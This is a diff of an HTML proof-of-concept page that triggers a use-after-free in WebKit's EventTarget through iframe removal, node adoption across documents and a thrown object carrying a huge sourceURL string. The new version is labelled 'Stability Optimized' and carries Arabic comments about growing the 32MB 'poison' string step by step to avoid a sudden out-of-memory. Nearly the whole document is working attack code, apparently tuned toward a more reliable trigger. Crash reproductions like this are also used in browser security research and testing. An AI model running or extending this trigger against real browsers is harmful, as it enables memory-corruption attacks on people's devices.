@@ -1,37 +1,40 @@
 <!DOCTYPE html>
 <html>
 <body>
-<p>Use-after-free in Webkit EventTarget.</p>
-<button onclick="main()">Click to trigger the bug</button>
+    <h3>WebKit UAF - Stability Optimized</h3>
+    <button onclick="main()">Click to trigger the bug</button>
+    <div id="status" style="font-family: monospace; color: #555;">Status: Waiting...</div>
 
-<script>
-function main() {
-    const f = document.body.appendChild(document.createElement('iframe'));
+    <script>
+        function main() {
+            document.getElementById('status').innerText = "Status: Triggering...";
+            
+            const f = document.body.appendChild(document.createElement('iframe'));
+            const a = document.createElement('div');
+            const b = a.appendChild(document.createElement('div'));
 
-    const a = document.createElement('div');
-    const b = a.appendChild(document.createElement('div'));
+            a.addEventListener('a', eval(`(function () {
+                document.adoptNode(a);
+                f.remove();
 
-    a.addEventListener('a', eval(`(function () {
-        document.adoptNode(a);
-        f.remove();
+                // بناء السلسلة تدريجياً لتجنب الـ OOM المفاجئ
+                let poison = 'A'.repeat(1024 * 1024 * 4); // 4MB
+                for(let i=0; i<3; i++) { poison += poison; } // زيادة تدريجية للوصول لـ 32MB
 
-        throw {
-            line: 1,
-            column: 1,
-            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
-        };
-    })`));
+                throw {
+                    line: 1,
+                    column: 1,
+                    sourceURL: poison
+                };
+            })`));
 
-    a.addEventListener('a', () => {});
+            a.addEventListener('a', () => {});
+            b.addEventListener('a', () => {
+                f.contentDocument.adoptNode(a);
+            });
 
-    b.addEventListener('a', () => {
-        f.contentDocument.adoptNode(a);
-    });
-
-    b.dispatchEvent(new Event('a', { bubbles: true }));
-}
-
-</script>
-
+            b.dispatchEvent(new Event('a', { bubbles: true }));
+        }
+    </script>
 </body>
 </html>
